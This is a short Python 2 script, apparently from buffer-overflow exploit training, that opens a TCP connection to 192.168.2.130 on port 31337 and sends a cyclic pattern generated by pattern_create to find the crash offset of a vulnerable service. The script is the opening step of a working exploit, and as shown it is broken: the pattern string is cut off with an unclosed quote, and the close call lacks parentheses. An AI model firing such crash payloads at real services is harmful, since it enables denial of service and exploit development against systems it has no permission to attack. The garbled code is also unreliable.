#!/usr/bin/env python2
import socket

# patter_create -l 3000
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8>
pattern += "\n"

print "Done.".format(pattern)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.2.130", 31337))
s.send(pattern)
s.close
